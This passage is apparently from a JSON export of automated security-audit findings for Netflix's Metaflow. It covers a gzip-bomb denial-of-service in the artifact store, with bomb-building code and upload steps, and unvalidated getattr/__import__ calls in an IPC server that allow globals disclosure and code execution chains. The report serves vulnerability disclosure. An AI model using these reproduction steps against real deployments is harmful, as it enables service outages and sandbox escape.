list\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/pypi/bootstrap.py:337","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/pypi/bootstrap.py:337","metaflow/plugins/pypi/bootstrap.py:352","metaflow/plugins/pypi/bootstrap.py:227-242","metaflow/plugins/pypi/bootstrap.py:245-256","metaflow/plugins/pypi/bootstrap.py:329","metaflow/plugins/pypi/bootstrap.py:42-55"],"finding_hash":"36fd09728d9b4be390dfaa0d7ce084e2","found_at":"2026-04-18T18:34:03.34805Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":9,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m3","module_name":"The Metaflow content-addressed store decompresses artifact blobs using `gzip.GzipFile.read()` with no size limit on decompressed output. An attacker with S3 write access can upload a gzip bomb -- a sm","module_type":"whitebox","finding_source":"archon","module_short":"gzip-bomb-cas-dos","description":"Phase: 8\nSequence: 005\nSlug: gzip-bomb-cas-dos\nVerdict: VALID\nRationale: Unbounded gzip decompression in content-addressed store enables DoS via crafted artifact blob; distinct impact profile (resource exhaustion, retry storms) and CWE (CWE-409) from the pickle RCE finding.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\n## Summary\n\nThe Metaflow content-addressed store decompresses artifact blobs using `gzip.GzipFile.read()` with no size limit on decompressed output. An attacker with S3 write access can upload a gzip bomb -- a small compressed blob that decompresses to gigabytes of data -- causing OOM kills in downstream step workers. In Kubernetes/Batch environments, this can trigger retry storms that amplify resource consumption across the cluster. The decompression occurs at `_unpack_v1` before the blob reaches `pickle.loads`, making it a distinct DoS vector from the pickle RCE (p8-001).\n\n## Location\n\n- **Sink**: `metaflow/datastore/content_addressed_store.py:217-219` -- `_unpack_v1()`\n- **Compression**: `metaflow/datastore/content_addressed_store.py:210-215` -- `_pack_v1()` (gzip level 3)\n\n## Attacker Control\n\nSame as p8-001: any principal with `s3:PutObject` on the artifact bucket. The attacker crafts a gzip bomb (high compression ratio, repetitive data) that is small when stored but expands to unbounded size when decompressed.\n\n## Trust Boundary Crossed\n\nCloud object storage (external, attacker-writable) -\u003e Task worker process memory (unbounded allocation from gzip decompression).\n\n## Impact\n\n- OOM kill of step worker process\n- In Kubernetes: pod eviction, potential node-level memory pressure\n- Retry storm amplification: Metaflow retries failed steps, each retry decompresses the same bomb\n- Cluster-wide resource exhaustion in shared compute environments\n- Distinct from RCE: DoS can affect availability even in hardened environments where RCE is mitigated\n\n## Evidence\n\n```python\n# content_addressed_store.py:217-219\ndef _unpack_v1(self, blob):\n    with gzip.GzipFile(fileobj=blob, mode=\"rb\") as f:\n        return f.read()  # NO size limit on decompressed output\n```\n\nA gzip file with 1MB compressed size can decompress to 1GB+ of data using repetitive byte patterns. The `f.read()` call allocates the full decompressed size in memory.\n\n## Reproduction Steps\n\n1. Create a gzip bomb:\n   ```python\n   import gzip\n   # 1GB of zeros compresses to ~1MB\n   data = b'\\x00' * (1024 * 1024 * 1024)\n   with gzip.open('/tmp/bomb.gz', 'wb', compresslevel=9) as f:\n       f.write(data)\n   ```\n2. Upload the gzip bomb to the S3 artifact bucket at the correct CAS path\n3. Update task metadata to point an artifact name to the bomb's SHA1 key\n4. Run a downstream step that loads the artifact\n5. Observe OOM kill as `_unpack_v1` attempts to decompress 1GB+ into memory\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/datastore/content_addressed_store.py:217-219","repo_name":"Netflix/metaflow","matched_at":["metaflow/datastore/content_addressed_store.py:217-219","metaflow/datastore/content_addressed_store.py:210-215"],"finding_hash":"43afae9b7b03c0d41898a53c46df9822","found_at":"2026-04-18T18:34:03.348049Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":8,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m2","module_name":"The env_escape IPC server dispatches `OP_GETCLASSATTR` and `OP_SUBCLASSCHECK` messages to handler functions that pass attacker-controlled input directly to `getattr()` and `__import__()` without valid","module_type":"whitebox","finding_source":"archon","module_short":"getattr-import-unrestricted-ipc","description":"Phase: 8\nSequence: 003\nSlug: getattr-import-unrestricted-ipc\nVerdict: VALID\nRationale: Unrestricted getattr and __import__ with attacker-controlled input provide information disclosure and code execution primitives independent of pickle; the two-step __init__.__globals__ chain and incremental module import persist even if pickle is mitigated; Advocate found no attr_name allowlist or module restriction.\nSeverity-Original: HIGH\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-01/debate.md\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Unrestricted getattr and __import__ with attacker-controlled strings confirmed via reproduction; arbitrary module import (subprocess, ctypes) and dunder attribute access (__init__, __qualname__, __module__) demonstrated; severity downgraded due to serialization barriers blocking __globals__ exfiltration and local-only socket with single-client race condition.\nSeverity-Final: MEDIUM\nPoC-Status: executed\n\n## Summary\n\nThe env_escape IPC server dispatches `OP_GETCLASSATTR` and `OP_SUBCLASSCHECK` messages to handler functions that pass attacker-controlled input directly to `getattr()` and `__import__()` without validation. While `class_name` is validated against `_known_classes` / `_proxied_types`, the `attr_name` parameter in `_handle_getclassattr` and the `sub_module` parameter in `_handle_subclasscheck` are completely unvalidated. An attacker can exploit this to: (1) chain `__init__.__globals__` to exfiltrate module-level globals including imported modules and configuration, (2) force-import arbitrary Python modules (including stdlib modules like `os`, `subprocess`, `ctypes`) to populate `sys.modules`, then access their functions via subsequent getattr calls. These primitives are independent of pickle deserialization and remain exploitable even if pickle.loads is mitigated.\n\n## Location\n\n- **getattr sink**: `metaflow/plugins/env_escape/server.py:547` -- `return getattr(class_type, attr_name)` with unvalidated `attr_name`\n- **getattr sink 2**: `metaflow/plugins/env_escape/server.py:430` -- `return getattr(target, name)` with unvalidated `name`\n- **__import__ sink**: `metaflow/plugins/env_escape/server.py:531` -- `__import__(sub_module, None, None, \"*\")` with unvalidated `sub_module`\n- **Handler registration**: `metaflow/plugins/env_escape/server.py:250-269` -- dispatch table mapping op types to handlers\n\n## Attacker Control\n\nVia the same unauthenticated Unix socket as p8-002:\n1. `attr_name` in `OP_GETCLASSATTR` messages -- any string passed to `getattr(class_type, attr_name)`\n2. `name` in `OP_GETATTR` messages -- any string passed to `getattr(target, name)`\n3. `otherclass_name` in `OP_SUBCLASSCHECK` messages -- parsed via `rsplit(\".\", 1)` to extract `sub_module` for `__import__`\n\n## Trust Boundary Crossed\n\nSame as p8-002: local process -\u003e outer Python environment (conda sandbox escape). The getattr chain additionally crosses a data boundary: Python introspection API exposes internal module state (globals, imported modules, class hierarchies) that should not be accessible to IPC clients.\n\n## Impact\n\n- **Information disclosure**: `__init__.__globals__` exfiltrates the module namespace of any exported class's defining module, which may contain credentials, configuration, imported modules\n- **Code execution via __import__**: Force-importing modules triggers `__init__.py` execution; combined with getattr chain, attacker can access `os.system`, `subprocess.Popen`, or `ctypes` functions\n- **Persistence across pickle mitigation**: These primitives do NOT use pickle and remain exploitable even if pickle.loads is replaced with safe deserialization\n- **Class hierarchy enumeration**: `__subclasses__()`, `__mro__`, `__bases__` expose the full type system of the server process\n\n## Evidence\n\n```python\n# server.py:540-547 -- unvalidated attr_name\ndef _handle_getclassattr(self, target, class_name, attr_name):\n    class_type = self._known_classes.get(class_name)\n    if class_type is None:\n        class_type = self._proxied_types.get(class_name)\n    if class_type is None:\n        raise ValueError(\"Unknown class %s\" % class_name)\n    return getattr(class_type, attr_name)  # attr_name: ANY string from IPC\n```\n\n```python\n# server.py:525-538 -- unvalidated sub
